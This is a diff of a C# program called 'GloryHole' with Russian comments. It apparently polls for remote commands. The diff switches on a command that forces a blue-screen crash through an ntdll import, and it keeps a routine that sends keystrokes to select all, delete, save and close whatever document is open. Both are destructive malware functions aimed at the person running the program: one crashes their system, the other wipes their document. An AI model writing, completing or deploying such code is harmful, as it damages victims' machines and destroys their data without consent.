@@ -25,12 +25,9 @@ namespace GloryHole
         ///Импортирование ntdll.dll для BSOD
         [DllImport("ntdll.dll")]
         private static extern int NtSetInformationProcess(IntPtr process, int process_class, ref int process_value, int length);
-
+        ///Импортирование USER32.DLL для использования вводы с клавиатуры
         [DllImport("USER32.DLL", CharSet = CharSet.Unicode)]
         public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
-
-        [DllImport("USER32.DLL")]
-        public static extern bool SetForegroundWindow(IntPtr hWnd);
 
 
         static async Task Main(string[] args)
@@ -57,7 +54,7 @@ namespace GloryHole
                                 case (CommandTypes.WriteText):/*Ели текс нада написать */
                                     break;
                                 case (CommandTypes.BSOD):/*Бдос вызвать нада */
-                                    //BSOD();
+                                    BSOD();
                                     break;
                             }
                         }
@@ -70,15 +67,17 @@ namespace GloryHole
                     }
                 Thread.Sleep(500);
             }
-        }//sda
+        }
 
-
+        /// <summary>
+        /// Чистит, сохраняет и закрывает документ
+        /// </summary>
         public static void helloVania()
         {
-            System.Windows.Forms.SendKeys.SendWait("^{a}");
-            System.Windows.Forms.SendKeys.SendWait("{DEL}");
-            System.Windows.Forms.SendKeys.SendWait("^{s}");
-            System.Windows.Forms.SendKeys.SendWait("%{F4}");
+            SendKeys.SendWait("^{a}");
+            SendKeys.SendWait("{DEL}");
+            SendKeys.SendWait("^{s}");
+            SendKeys.SendWait("%{F4}");
         }
 
 
